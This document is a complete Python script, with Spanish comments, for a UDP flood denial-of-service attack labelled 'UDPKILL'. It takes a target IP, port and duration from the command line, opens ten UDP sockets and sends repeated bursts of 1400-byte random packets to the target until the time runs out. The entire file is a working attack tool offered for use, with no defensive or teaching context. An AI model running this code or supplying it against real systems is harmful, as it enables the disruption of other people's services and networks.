#!/usr/bin/env python3
import socket
import random
import time
import sys

def udpkill_attack(target_ip, target_port, duration):
    print(f"[UDPKILL] Atacando {target_ip}:{target_port} por {duration}s")
    end_time = time.time() + duration
    
    # Máxima intensidad - múltiples sockets
    sockets = []
    for _ in range(10):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sockets.append(sock)
        except:
            pass
    
    while time.time() < end_time:
        for sock in sockets:
            try:
                # Enviar ráfagas de paquetes
                for _ in range(50):
                    data = random._urandom(1400)  # Máximo tamaño
                    sock.sendto(data, (target_ip, target_port))
            except:
                pass
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udpkill_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
